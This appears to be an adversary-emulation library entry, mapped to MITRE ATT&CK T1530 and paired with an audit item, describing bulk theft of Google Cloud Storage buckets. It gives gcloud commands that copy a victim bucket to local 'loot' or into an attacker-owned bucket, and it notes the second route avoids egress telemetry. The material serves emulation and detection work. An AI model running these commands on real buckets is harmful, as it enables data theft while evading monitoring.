---
id: gcp-gcs-mass-exfil
title: GCS bulk object exfil (mass storage.objects.get / rewrite)
section: GCP / cloud collection
phase: Collection
attack:
  tactic: TA0009
  techniques: [T1530]
platform: [cloud]
source: MITRE ATT&CK T1530; Cloud Storage object-store data theft
pair: gcp-gcs-exfil-audit
---

GCS is the GCP answer to the S3 smash-and-grab: with a token or service-account key
that carries `storage.objects.list`/`get`, enumerate a bucket and pull it wholesale.
`gcloud storage ls --recursive` maps the objects, then a bulk `cp` drags them out —
or, to keep the bytes inside Google and dodge egress telemetry, a server-side copy
straight into an attacker-owned bucket (a `storage.objects.rewrite`, no local hop).
The volume is the point: hundreds to thousands of object reads from one identity in a
short window, often the first time that principal has ever touched the bucket. Use
`gcloud storage` — the current CLI that supersedes legacy `gsutil`. (Cloud — no
on-host target, so no slots.)

```sh
# map, then drag the whole bucket out to local loot
gcloud storage ls --recursive gs://<victim-bucket>
gcloud storage cp --recursive gs://<victim-bucket> ./loot
# …or server-side rewrite into an attacker bucket — bytes never leave Google
gcloud storage cp --recursive gs://<victim-bucket> gs://<attacker-bucket>
```
